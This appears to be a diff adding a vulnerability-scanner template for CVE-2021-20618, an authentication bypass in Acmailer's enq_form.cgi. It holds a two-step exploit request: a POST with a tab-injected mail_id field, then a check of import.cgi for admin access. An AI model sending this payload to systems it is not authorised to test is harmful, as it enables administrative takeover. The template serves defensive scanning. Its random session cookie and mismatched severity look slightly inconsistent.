@@ -1,0 +1,50 @@
+id: cve-2021-20618
+info:
+  name: Acmailer enq_form.cgi Authentication Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Acmailer 4.0.2 and earlier versions have a vulnerability allowing remote attackers to bypass authentication and gain administrative privileges. Exploited via enq_form.cgi.
+  classification:
+    cve-id: CVE-2021-20618
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.0
+  tags: authentication-bypass,acmailer
+
+variables:
+  session: "{{rand_base(6)}}"
+  username: "{{rand_base(6)}}"
+  password: "{{rand_base(6)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: step1
+    method: POST
+    path:
+      - "{{BaseURL}}/enq_form.cgi"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      id=subaccount&mail_id=AA%09{{username}}&key=CC&reg=DD&answer_={{password}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: step2
+    method: GET
+    path:
+      - "{{BaseURL}}/import.cgi"
+    headers:
+      Cookie: "sid={{session}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "admin_edit.cgi?display="
